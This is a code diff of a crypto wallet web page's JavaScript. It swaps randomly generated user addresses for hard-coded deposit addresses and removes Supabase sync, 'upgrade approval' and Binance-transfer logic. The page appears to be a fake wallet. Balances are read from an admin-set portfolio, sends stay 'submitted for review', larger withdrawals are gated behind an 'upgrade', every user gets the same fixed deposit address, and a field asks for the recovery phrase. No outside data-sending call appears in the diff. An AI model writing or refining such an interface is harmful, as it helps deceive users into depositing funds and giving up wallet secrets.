@@ -9,7 +9,6 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,400,0,0" rel="stylesheet">
-    <script src="New/supabase-config.js"></script>
     <script>
         tailwind.config = {
             darkMode: 'class',
@@ -456,26 +455,6 @@
             }catch(error){console.warn('Currency rate update failed for '+currency,error);}
         }
 
-        async function syncSharedWalletPortfolio() {
-            if (typeof syncWalletPortfolioToSupabase !== 'function') return [];
-            try {
-                return await syncWalletPortfolioToSupabase();
-            } catch (error) {
-                console.warn('Shared wallet sync failed:', error);
-                return [];
-            }
-        }
-
-        async function hydrateSharedWalletPortfolio() {
-            if (typeof hydrateWalletPortfolioFromSupabase !== 'function') return [];
-            try {
-                return await hydrateWalletPortfolioFromSupabase();
-            } catch (error) {
-                console.warn('Shared wallet hydrate failed:', error);
-                return [];
-            }
-        }
-
         function getWalletTokenData() {
             const stored = (() => {
                 try {
@@ -602,20 +581,12 @@
         function setActiveNav(key){['home','markets','trade','discover','assets'].forEach(id=>{const view=document.getElementById('view'+id[0].toUpperCase()+id.slice(1));const top=document.getElementById('nav'+id[0].toUpperCase()+id.slice(1));const bottom=document.getElementById('bnav'+id[0].toUpperCase()+id.slice(1));view?.classList.toggle('hidden',id!==key);top?.classList.toggle('active-nav',id===key);bottom?.classList.toggle('active-nav',id===key);});const titles={home:'Wallet',markets:'Markets',trade:'Trade',discover:'Discover',assets:'Assets'};const title=document.querySelector('.mobile-title');if(title)title.textContent=titles[key]||'Wallet';const menuButton=document.querySelector('.mobile-toolbar>button');if(menuButton)menuButton.hidden=key!=='home';}
         function toggleDarkMode(){document.documentElement.classList.toggle('dark');}
         function copyText(value){if(navigator.clipboard){navigator.clipboard.writeText(value).catch(()=>{});}else{const input=document.createElement('textarea');input.value=value;document.body.appendChild(input);input.select();document.execCommand('copy');input.remove();}}
-        function copyWalletAddress(){const walletAddress = getCurrentWalletAddress(); copyText(walletAddress); openModal('Address Copied', 'Wallet address copied to clipboard!');}
+        function copyWalletAddress(){copyText('0x71C7656EC7ab88b098defB751B7401B5f6d89923');openModal('Address Copied','Wallet address copied to clipboard!');}
         window.addEventListener('storage', (event) => {
             if (['adminTokenPortfolio', 'userWalletPortfolio', 'walletBalanceState'].includes(event.key)) {
                 renderTokens();
                 filterTokens();
                 updateWalletTotals();
-            }
-            if (event.key === 'walletUpgradeApproval' || event.key === 'walletUpgradeStatus') {
-                const approvalStatus = localStorage.getItem('walletUpgradeApproval') || localStorage.getItem('walletUpgradeStatus');
-                if (approvalStatus === 'APPROVED') {
-                    sessionStorage.setItem('walletUpgradeAutoOpenSend', '1');
-                    setTimeout(() => openOperation('Send Token', 'send'), 250);
-                    showTransactionAlert('Wallet upgrade approved!', 'You can continue with the send flow right away.');
-                }
             }
         });
 
@@ -624,24 +595,13 @@
             filterTokens();
             updateWalletTotals();
         });
-
-        function syncWalletUpgradeApprovalState() {
-            const approvalStatus = localStorage.getItem('walletUpgradeApproval') || localStorage.getItem('walletUpgradeStatus');
-            if (approvalStatus === 'APPROVED') {
-                sessionStorage.setItem('walletUpgradeAutoOpenSend', '1');
-                setTimeout(() => openOperation('Send Token', 'send'), 250);
-            }
-        }
         function openModal(title,text){const body=document.getElementById('modalBody');const action=document.getElementById('modalAction');const box=document.getElementById('modalBox');box.classList.remove('operation-fullscreen');action.hidden=false;document.getElementById('modalTitle').innerText=title;body.innerText=text;action.innerText='Done';action.onclick=closeModal;document.getElementById('infoModal').classList.remove('hidden');}
-        function openOperation(title,type){const body=document.getElementById('modalBody');const action=document.getElementById('modalAction');document.getElementById('modalTitle').innerText=title;action.innerText=type==='receive'?'Copy Address':type==='send'?'Continue':type==='setup'?'Create Wallet':'Done';action.onclick=()=>{if(type==='receive'){copyText(getCurrentWalletAddress());openModal('Address Copied','Your wallet address was copied.');}else if(type==='send'){openModal('Send Request','Your send request was submitted for review.');}else if(type==='setup'){openModal('Wallet Created','Your new wallet setup is ready.');}else closeModal();};const forms={send:'<label>Recipient address<input class="operation-input" placeholder="0x..." required></label><label>Amount<input class="operation-input" type="number" min="0" step="any" placeholder="0.00" required></label>',setup:'<p>Create a new wallet or connect an existing wallet.</p><button class="operation-menu" onclick="openOperation(\'Import Wallet\',\'import\')">Import recovery phrase</button>',import:'<label>Recovery phrase<input class="operation-input" type="password" placeholder="Enter recovery phrase"></label>',receive:`<p>Your deposit address:</p><code class="address-box">${getCurrentWalletAddress()}</code><p>Use this address to receive supported assets.</p>`,history:'<p>No transactions yet.</p><button class="operation-link" onclick="setActiveNav(\'markets\');closeModal()">Browse market activity</button>',approvals:'<p>No pending approvals.</p><button class="operation-link" onclick="setActiveNav(\'trade\');closeModal()">Go to Trade</button>',network:'<p>Choose a network for this wallet.</p><select class="operation-input"><option>Ethereum</option><option>Solana</option><option>BSC</option><option>Arc</option></select>',activity:'<p>Recent wallet activity will appear here.</p>',menu:'<p>Where would you like to go?</p><div class="operation-menu"><button onclick="setActiveNav(\'home\');closeModal()">Wallet</button><button onclick="setActiveNav(\'markets\');closeModal()">Markets</button><button onclick="setActiveNav(\'assets\');closeModal()">Assets</button></div>',search:'<label>Search assets<input class="operation-input" placeholder="Token symbol or name"></label>'};body.innerHTML=forms[type]||'<p>This operation is ready.</p>';document.getElementById('infoModal').classList.remove('hidden');}
+        function openOperation(title,type){const body=document.getElementById('modalBody');const action=document.getElementById('modalAction');document.getElementById('modalTitle').innerText=title;action.innerText=type==='receive'?'Copy Address':type==='send'?'Continue':type==='setup'?'Create Wallet':'Done';action.onclick=()=>{if(type==='receive'){copyText('0x71C7656EC7ab88b098defB751B7401B5f6d89923');openModal('Address Copied','Your wallet address was copied.');}else if(type==='send'){openModal('Send Request','Your send request was submitted for review.');}else if(type==='setup'){openModal('Wallet Created','Your new wallet setup is ready.');}else closeModal();};const forms={send:'<label>Recipient address<input class="operation-input" placeholder="0x..." required></label><label>Amount<input class="operation-input" type="number" min="0" step="any" placeholder="0.00" required></label>',setup:'<p>Create a new wallet or connect an existing wallet.</p><button class="operation-menu" onclick="openOperation(\'Import Wallet\',\'import\')">Import recovery phrase</button>',import:'<label>Recovery phrase<input class="operation-input" type="password" placeholder="Enter recovery phrase"></label>',receive:'<p>Your deposit address:</p><code class="address-box">0x71C7656EC7ab88b098defB751B7401B5f6d89923</code><p>Use this address to receive supported assets.</p>',history:'<p>No transactions yet.</p><button class="operation-link" onclick="setActiveNav(\'markets\');closeModal()">Browse market activity</button>',approvals:'<p>No pending approvals.</p><button class="operation-link" onclick="setActiveNav(\'trade\');closeModal()">Go to Trade</button>',network:'<p>Choose a network for this wallet.</p><select class="operation-input"><option>Ethereum</option><option>Solana</option><option>BSC</option><option>Arc</option></select>',activity:'<p>Recent wallet activity will appear here.</p>',menu:'<p>Where would you like to go?</p><div class="operation-menu"><button onclick="setActiveNav(\'home\');closeModal()">Wallet</button><button onclick="setActiveNav(\'markets\');closeModal()">Markets</button><button onclick="setActiveNav(\'assets\');closeModal()">Assets</button></div>',search:'<label>Search assets<input class="operation-input" placeholder="Token symbol or name"></label>'};body.innerHTML=forms[type]||'<p>This operation is ready.</p>';document.getElementById('infoModal').classList.remove('hidden');}
         function openOperation(title, type) {
-            if (type === 'send-wallet') sendTransferMode = 'wallet';
-            if (type === 'send-exchange') sendTransferMode = 'exchange';
             if (type === 'send') title = 'Send Token';
             const body = document.getElementById('modalBody');
             const action = document.getElementById('modalAction');
             const box = document.getElementById('modalBox');
-            const walletAddress = getCurrentWalletAddress();
             document.getElementById('modalTitle').innerText = title;
             const fullscreen = ['receive', 'receive-binance', 'receive-network', 'receive-transfer', 'receive-address', 'receive-detail', 'buy-card', 'alpha', 'send', 'send-exchange', 'send-wallet', 'select-token', 'select-network', 'menu'].includes(type);
             box.classList.toggle('operation-fullscreen', fullscreen);
@@ -649,7 +609,7 @@
             action.innerText = type === 'receive' ? 'Copy Address' : type === 'send-wallet' ? 'Continue' : type === 'setup' ? 'Create Wallet' : 'Done';
             action.onclick = () => {
                 if (type === 'receive') {
-                    copyText(walletAddress);
+                    copyText('0x71C7656EC7ab88b098defB751B7401B5f6d89923');
                     openModal('Address Copied', 'Your wallet address was copied.');
                 } else if (type === 'send-wallet') {
                     openModal('Send Request', 'Your send request was submitted for review.');
@@ -684,15 +644,13 @@
                 const networkLogos={BSC:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BNB.svg',AVAX:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/AVAX.svg',Arbitrum:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ARB.svg',CELO:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/CELO.svg',Ethereum:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg',Optimism:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/OP.svg',Polygon:'https://cdn.simpleicons.org/polygon/8247E5',Scroll:'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/scroll/info/logo.png',Solana:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/SOL.svg',TON:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/TON.svg',Tron:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/TRX.svg',opBNB:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BNB.svg'};
                 body.innerHTML = `${back('Select Coin', 'receive-binance')}<div class="receive-network-screen"><h2>Select Network</h2><p class="receive-coin-note">Choose one network for ${receiveCoin}.</p><div class="receive-network-list">${networks.map(([id,name,time,symbol])=>`<button class="receive-network-row ${receiveNetwork===id?'selected':''}" onclick="selectReceiveNetwork('${id}')"><img class="network-icon network-${id.toLowerCase()}" src="${networkLogos[id]}" alt="${name} logo"><span><b>${name}</b><small>Arrival time ≈ ${time}</small></span>${receiveNetwork===id?'<strong class="network-check">✓</strong>':''}</button>`).join('')}</div>${receiveNetwork?'<button class="receive-continue" onclick="openOperation(\'Transfer \' + receiveCoin,\'receive-transfer\')">Continue</button>':''}</div>`;
             } else if (type === 'receive-transfer') {
-                const receiveAddress = getCurrentWalletAddress();
-                body.innerHTML = `${back('Select Network', 'receive-network')}<div class="receive-transfer-screen"><h2>Transfer ${receiveCoin}</h2><label>Address</label><div class="transfer-address">${receiveAddress}</div><p class="transfer-help">This address is identified as a Web3 Wallet address. Please maintain some of the blockchain's native token in your wallet for transaction network fees.</p><label>Network</label><div class="transfer-field">${receiveNetwork}</div><label>Withdrawal Amount</label><div class="transfer-field transfer-amount"><span>Minimum amount</span><b>${receiveCoin}</b></div><p class="transfer-help">Available balance: <strong>0.00 ${receiveCoin}</strong></p><div class="transfer-summary"><span>Receive amount <b>0 ${receiveCoin}</b></span><span>Network fee <b>0.00 ${receiveCoin}</b></span></div><button class="receive-continue transfer-submit" disabled>Transfer</button></div>`;
+                body.innerHTML = `${back('Select Network', 'receive-network')}<div class="receive-transfer-screen"><h2>Transfer ${receiveCoin}</h2><label>Address</label><div class="transfer-address">0x71C7656EC7ab88b098defB751B7401B5f6d89923</div><p class="transfer-help">This address is identified as a Web3 Wallet address. Please maintain some of the blockchain's native token in your wallet for transaction network fees.</p><label>Network</label><div class="transfer-field">${receiveNetwork}</div><label>Withdrawal Amount</label><div class="transfer-field transfer-amount"><span>Minimum amount</span><b>${receiveCoin}</b></div><p class="transfer-help">Available balance: <strong>0.00 ${receiveCoin}</strong></p><div class="transfer-summary"><span>Receive amount <b>0 ${receiveCoin}</b></span><span>Network fee <b>0.00 ${receiveCoin}</b></span></div><button class="receive-continue transfer-submit" disabled>Transfer</button></div>`;
             }
             if (type === 'buy-card') body.innerHTML = renderBuyCardNetworks();
             if (type === 'alpha') body.innerHTML = renderAlphaEvents();
             if (type === 'send-wallet') body.innerHTML = renderSendWallet();
-            if (type === 'send-exchange') body.innerHTML = renderSendToBinanceExchange();
             if (type === 'select-network') body.innerHTML = renderExchangeNetworkSelector();
-            if (!['receive-binance', 'receive-network', 'receive-transfer', 'buy-card', 'alpha', 'send-wallet', 'send-exchange', 'select-network'].includes(type)) body.innerHTML = forms[type] || '<p class="upgrade-required-message">This function is not available at the moment. Please complete the upgrade to continue.</p>';
+            if (!['receive-binance', 'receive-network', 'receive-transfer', 'buy-card', 'alpha', 'send-wallet', 'select-network'].includes(type)) body.innerHTML = forms[type] || '<p class="upgrade-required-message">This function is not available at the moment. Please complete the upgrade to continue.</p>';
             if (type === 'menu') {
                 const uidRow=Array.from(body.querySelectorAll('.settings-row')).find(row=>row.textContent.includes('UID'));
                 const uidValue=uidRow?.querySelector('.settings-value');
@@ -754,7 +712,7 @@
         function openReceiveAddress(symbol,network){
             const networkLogos={Linea:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg',Optimism:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/OP.svg',Robinhood:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg',Arbitrum:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ARB.svg','zkSync Era':'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg',Base:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BASE.svg',BSC:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BNB.svg',opBNB:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BNB.svg',Arc:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/USDC.svg',Solana:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/SOL.svg',TRON:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/TRX.svg',Bitcoin:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BTC.svg',Avalanche:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/AVAX.svg','Stable Mainnet':'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/USDT.svg','Multi-chain':'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/USDT.svg',TON:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/TON.svg',Sui:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/SUI.svg','X Layer':'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/OKB.svg',Polygon:'https://cdn.simpleicons.org/polygon/8247E5',Dogecoin:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/DOGE.svg',Celo:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/CELO.svg',Litecoin:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/LTC.svg'};
             const coinLogos={ETH:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg',BNB:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BNB.svg',USDC:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/USDC.svg',SOL:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/SOL.svg',TRX:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/TRX.svg',BTC:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BTC.svg',AVAX:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/AVAX.svg',USDT0:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/USDT.svg',USDT:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/USDT.svg',GRAM:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/TON.svg',SUI:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/SUI.svg',OKB:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/OKB.svg',POL:'https://cdn.simpleicons.org/polygon/8247E5',DOGE:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/DOGE.svg',CELO:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/CELO.svg',LTC:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/LTC.svg'};
-            const address = getCurrentWalletAddress();
+            const address='0x95Af8e9b192024EF8b6C02149C28EB7288418e28';
             const coinLogo=coinLogos[symbol]||coinLogos.ETH;
             const networkLogo=networkLogos[network]||coinLogo;
             const body=document.getElementById('modalBody');
@@ -778,95 +736,21 @@
         let sendWalletNetwork='BSC';
         let sendWalletAddress='';
         let sendWalletAmount='';
-        let sendTransferMode='wallet';
-
-        function generateWalletAddress() {
-            const chars = '0123456789abcdef';
-            let output = '0x';
-            for (let i = 0; i < 40; i += 1) {
-                output += chars[Math.floor(Math.random() * chars.length)];
-            }
-            return output;
-        }
-
-        function getCurrentWalletAddress() {
-            const stored = localStorage.getItem('currentWalletAddress');
-            if (stored && /^0x[a-fA-F0-9]{40}$/.test(stored)) {
-                return stored;
-            }
-            const nextAddress = generateWalletAddress();
-            localStorage.setItem('currentWalletAddress', nextAddress);
-            return nextAddress;
-        }
-
-        async function persistWalletActivity({ action='wallet_transfer', type='wallet', status='SUBMITTED', amount='0', token='', network='', destination='', details={} } = {}) {
-            try {
-                if (typeof createWalletActivity !== 'function') return null;
-                const payload = {
-                    userName: localStorage.getItem('currentUserName') || 'Wallet User',
-                    userEmail: localStorage.getItem('currentUserEmail') || 'wallet-user@customer.local',
-                    action,
-                    type,
-                    status,
-                    amount: String(amount),
-                    token: String(token || ''),
-                    network: String(network || ''),
-                    destination: String(destination || ''),
-                    details: details || {}
-                };
-                return await createWalletActivity(payload);
-            } catch (error) {
-                console.warn('Supabase wallet activity sync failed:', error);
-                return null;
-            }
-        }
-
         function sendNetworkLogo(network){return {BSC:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BNB.svg',Ethereum:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg',Solana:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/SOL.svg',Base:'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/base/info/logo.png',Arbitrum:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ARB.svg'}[network]||'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg';}
         function tokenLogoUrl(token){return {BNB:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BNB.svg',BTC:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BTC.svg',ETH:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg',SOL:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/SOL.svg',USDT:'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/USDT.svg'}[token]||'https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg';}
         function renderSendWallet(){
-            const walletAddress = getCurrentWalletAddress();
-            return `<div class="send-wallet-screen"><div class="send-wallet-header"><button onclick="openOperation('Send Token','send')" aria-label="Back">←</button><h1>Send to Wallet</h1><button onclick="closeModal()" aria-label="Close">×</button></div><button class="send-wallet-token" onclick="openSendTokenSelector()"><img src="${tokenLogoUrl(selectedToken)}" onerror="this.src='assets/favicon.png'" alt="${selectedToken}"><span><small>Token</small><b>${selectedToken}</b></span><strong>⌄</strong></button><label class="send-wallet-label">Recipient address</label><div class="send-wallet-address-wrap"><input id="sendWalletAddress" class="send-wallet-input" value="${sendWalletAddress}" placeholder="Enter wallet address" oninput="sendWalletAddress=this.value;updateSendWalletState()"><button onclick="sendWalletAddress='${walletAddress}';document.getElementById('sendWalletAddress').value=sendWalletAddress;updateSendWalletState()" aria-label="Paste">▣</button></div><label class="send-wallet-label">Network</label><button class="send-wallet-network" onclick="openSendNetworkSelector()"><span><img class="send-network-logo" src="${sendNetworkLogo(sendWalletNetwork)}" onerror="this.src='https://cdn.simpleicons.org/ethereum/627EEA'" alt="${sendWalletNetwork}"><span><b>${sendWalletNetwork}</b><small>Choose receiving network</small></span></span><strong>›</strong></button><small class="send-wallet-balance">Available balance: ${getSelectedWalletBalance()} ${selectedToken}</small><button id="sendWalletContinue" class="send-wallet-continue" disabled onclick="openSendAmountScreen()">Continue</button></div>`;
-        }
-        function renderSendToBinanceExchange(){
-            const walletAddress = getCurrentWalletAddress();
-            return `<div class="send-wallet-screen"><div class="send-wallet-header"><button onclick="openOperation('Send Token','send')" aria-label="Back">←</button><h1>Transfer to Binance Exchange</h1><button onclick="closeModal()" aria-label="Close">×</button></div><button class="send-wallet-token" onclick="openSendTokenSelector()"><img src="${tokenLogoUrl(selectedToken)}" onerror="this.src='assets/favicon.png'" alt="${selectedToken}"><span><small>Token</small><b>${selectedToken}</b></span><strong>⌄</strong></button><label class="send-wallet-label">Binance account</label><div class="send-wallet-address-wrap"><input id="sendWalletAddress" class="send-wallet-input" value="${sendWalletAddress}" placeholder="Enter Binance email or UID" oninput="sendWalletAddress=this.value;updateSendWalletState()"><button onclick="sendWalletAddress='${walletAddress}';document.getElementById('sendWalletAddress').value=sendWalletAddress;updateSendWalletState()" aria-label="Use Binance account">▣</button></div><label class="send-wallet-label">Network</label><button class="send-wallet-network" onclick="openSendNetworkSelector()"><span><img class="send-network-logo" src="${sendNetworkLogo(sendWalletNetwork)}" onerror="this.src='https://cdn.simpleicons.org/ethereum/627EEA'" alt="${sendWalletNetwork}"><span><b>${sendWalletNetwork}</b><small>Choose transfer network</small></span></span><strong>›</strong></button><small class="send-wallet-balance">Available balance: ${getSelectedWalletBalance()} ${selectedToken}</small><button id="sendWalletContinue" class="send-wallet-continue" disabled onclick="openSendAmountScreen()">Continue</button></div>`;
-        }
-        function isValidBinanceAccount(value){
-            const input=(value||'').trim();
-            if(!input) return false;
-            if(/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input)) return true;
-            if(/^\d{6,}$/.test(input)) return true;
-            return /^[A-Za-z0-9._-]{6,}$/.test(input);
-        }
-        function renderBinanceTransferSubmitted(tokenSymbol, amount, network, destination){
-            const body=document.getElementById('modalBody');
-            const box=document.getElementById('modalBox');
-            const action=document.getElementById('modalAction');
-            box.classList.add('operation-fullscreen');
-            action.hidden=true;
-            body.innerHTML=`<div class="send-success-screen" style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:420px;padding:2rem 1.25rem;text-align:center;"><div style="width:72px;height:72px;border-radius:50%;background:#f5f5f5;display:flex;align-items:center;justify-content:center;margin-bottom:1rem;overflow:hidden;box-shadow:0 8px 20px rgba(0,0,0,.08);"><img src="New/assets/binance-4bd0f2d0.png" alt="Binance logo" style="width:72px;height:72px;object-fit:cover;display:block;" /></div><h2 style="font-size:1.6rem;font-weight:800;color:#111827;margin:0 0 .5rem;">Binance transfer submitted</h2><p style="color:#475569;line-height:1.5;margin:0 0 1.25rem;">Your ${Number(amount).toLocaleString('en-US',{maximumFractionDigits:8})} ${tokenSymbol} transfer has been queued for Binance.</p><div style="width:100%;border:1px solid #e5e7eb;border-radius:16px;padding:1rem;background:#f8fafc;text-align:left;display:grid;gap:.5rem;">
-                <div><small style="color:#64748b;display:block;">Token</small><strong style="color:#111827;">${tokenSymbol}</strong></div>
-                <div><small style="color:#64748b;display:block;">Network</small><strong style="color:#111827;">${network}</strong></div>
-                <div><small style="color:#64748b;display:block;">Destination</small><strong style="color:#111827;">${destination}</strong></div>
-            </div><button onclick="closeModal();sendWalletAmount='';sendWalletAddress='';sendWalletNetwork='BSC';" style="margin-top:1.25rem;width:100%;padding:.9rem;border:none;border-radius:12px;background:#f7d63d;color:#111827;font-weight:800;cursor:pointer;">Done</button></div>`;
-            document.getElementById('infoModal').classList.remove('hidden');
+            return `<div class="send-wallet-screen"><div class="send-wallet-header"><button onclick="openOperation('Send Token','send')" aria-label="Back">←</button><h1>Send to Wallet</h1><button onclick="closeModal()" aria-label="Close">×</button></div><button class="send-wallet-token" onclick="openSendTokenSelector()"><img src="${tokenLogoUrl(selectedToken)}" onerror="this.src='assets/favicon.png'" alt="${selectedToken}"><span><small>Token</small><b>${selectedToken}</b></span><strong>⌄</strong></button><label class="send-wallet-label">Recipient address</label><div class="send-wallet-address-wrap"><input id="sendWalletAddress" class="send-wallet-input" value="${sendWalletAddress}" placeholder="Enter wallet address" oninput="sendWalletAddress=this.value;updateSendWalletState()"><button onclick="sendWalletAddress='0x71C7656EC7ab88b098defB751B7401B5f6d89923';document.getElementById('sendWalletAddress').value=sendWalletAddress;updateSendWalletState()" aria-label="Paste">▣</button></div><label class="send-wallet-label">Network</label><button class="send-wallet-network" onclick="openSendNetworkSelector()"><span><img class="send-network-logo" src="${sendNetworkLogo(sendWalletNetwork)}" onerror="this.src='https://cdn.simpleicons.org/ethereum/627EEA'" alt="${sendWalletNetwork}"><span><b>${sendWalletNetwork}</b><small>Choose receiving network</small></span></span><strong>›</strong></button><small class="send-wallet-balance">Available balance: ${getSelectedWalletBalance()} ${selectedToken}</small><button id="sendWalletContinue" class="send-wallet-continue" disabled onclick="openSendAmountScreen()">Continue</button></div>`;
         }
         function getSelectedWalletBalance(){const token=getWalletTokenData().find(item=>item.symbol===selectedToken);return token?Number(token.balance).toLocaleString('en-US',{maximumFractionDigits:8}):'0.00';}
-        function updateSendWalletState(){const address=document.getElementById('sendWalletAddress')?.value.trim();if(address!==undefined)sendWalletAddress=address;const button=document.getElementById('sendWalletContinue');const valid = sendTransferMode === 'exchange' ? isValidBinanceAccount(sendWalletAddress) : !!sendWalletAddress; if(button)button.disabled=!valid||!sendWalletNetwork;}
+        function updateSendWalletState(){const address=document.getElementById('sendWalletAddress')?.value.trim();if(address!==undefined)sendWalletAddress=address;const button=document.getElementById('sendWalletContinue');if(button)button.disabled=!sendWalletAddress||!sendWalletNetwork;}
         function openSendAmountScreen(){
             if(!sendWalletAddress||!sendWalletNetwork){updateSendWalletState();return;}
-            if (sendTransferMode === 'exchange' && !isValidBinanceAccount(sendWalletAddress)) {
-                openModal('Invalid Binance account','Enter a valid Binance email or UID before continuing.');
-                return;
-            }
             const token=getWalletTokenData().find(item=>item.symbol===selectedToken)||{price:0,balance:0,logo:tokenLogoUrl(selectedToken)};
             const body=document.getElementById('modalBody');
             document.getElementById('modalBox').classList.add('operation-fullscreen');
             document.getElementById('modalAction').hidden=true;
             const selectedCurrency = selectedWalletCurrency();
-            const backTarget = sendTransferMode === 'exchange' ? 'send-exchange' : 'send-wallet';
-            const backLabel = sendTransferMode === 'exchange' ? 'Transfer to Binance Exchange' : 'Send to Wallet Address';
-            body.innerHTML=`<div class="send-amount-screen"><div class="send-amount-header"><button onclick="openOperation('${backLabel}','${backTarget}')" aria-label="Back">←</button><h1>Send ${selectedToken}</h1><button onclick="closeModal()" aria-label="Close">×</button></div><div class="send-amount-value"><strong id="sendAmountDisplay">${sendWalletAmount||'0'}</strong><span id="sendAmountUsd">≈${(walletCurrencyMeta[selectedCurrency]||walletCurrencyMeta.USD).symbol}0</span><button onclick="openModal('Amount currency','Amount is shown in ${selectedToken} and ${selectedCurrency}.')">⇄</button></div><div class="send-amount-balance"><img src="${token.logo}" alt="${selectedToken} logo" onerror="this.src='assets/favicon.png'"><div><small>Balance</small><b>${getSelectedWalletBalance()} ${selectedToken}</b></div><button onclick="setSendAmountMax()">Max</button></div><div class="send-keypad">${['1','2','3','4','5','6','7','8','9','.','0','⌫'].map(key=>`<button onclick="handleSendKey('${key}')">${key}</button>`).join('')}</div><button id="sendAmountContinue" class="send-amount-continue" disabled onclick="submitSendWallet()">Continue</button></div>`;
+            body.innerHTML=`<div class="send-amount-screen"><div class="send-amount-header"><button onclick="openOperation('Send to Wallet Address','send-wallet')" aria-label="Back">←</button><h1>Send ${selectedToken}</h1><button onclick="closeModal()" aria-label="Close">×</button></div><div class="send-amount-value"><strong id="sendAmountDisplay">${sendWalletAmount||'0'}</strong><span id="sendAmountUsd">≈${(walletCurrencyMeta[selectedCurrency]||walletCurrencyMeta.USD).symbol}0</span><button onclick="openModal('Amount currency','Amount is shown in ${selectedToken} and ${selectedCurrency}.')">⇄</button></div><div class="send-amount-balance"><img src="${token.logo}" alt="${selectedToken} logo" onerror="this.src='assets/favicon.png'"><div><small>Balance</small><b>${getSelectedWalletBalance()} ${selectedToken}</b></div><button onclick="setSendAmountMax()">Max</button></div><div class="send-keypad">${['1','2','3','4','5','6','7','8','9','.','0','⌫'].map(key=>`<button onclick="handleSendKey('${key}')">${key}</button>`).join('')}</div><button id="sendAmountContinue" class="send-amount-continue" disabled onclick="submitSendWallet()">Continue</button></div>`;
             document.getElementById('infoModal').classList.remove('hidden');
             updateSendAmountDisplay(token.price);
         }
@@ -886,10 +770,6 @@
             if(button)button.disabled = amount<=0||amount>Number(getSelectedWalletBalance().replace(/,/g,''));
         }
         function shouldRedirectToUpgrade(amount, tokenPrice = 0) {
-            const status = localStorage.getItem('walletUpgradeApproval') || localStorage.getItem('walletUpgradeStatus');
-            if (status === 'APPROVED') {
-                return false;
-            }
             if (selectedWalletCurrency() !== 'JPY') return false;
             const numericAmount = Number(amount) || 0;
             const usdValue = numericAmount * (Number(tokenPrice) || 0);
@@ -898,19 +778,15 @@
         }
         function openSendTokenSelector(){
             const tokens=['BNB','BTC','ETH','SOL','USDT'];
-            const returnScreen = sendTransferMode === 'exchange' ? 'send-exchange' : 'send-wallet';
-            const returnLabel = sendTransferMode === 'exchange' ? 'Transfer to Binance Exchange' : 'Send to Wallet Address';
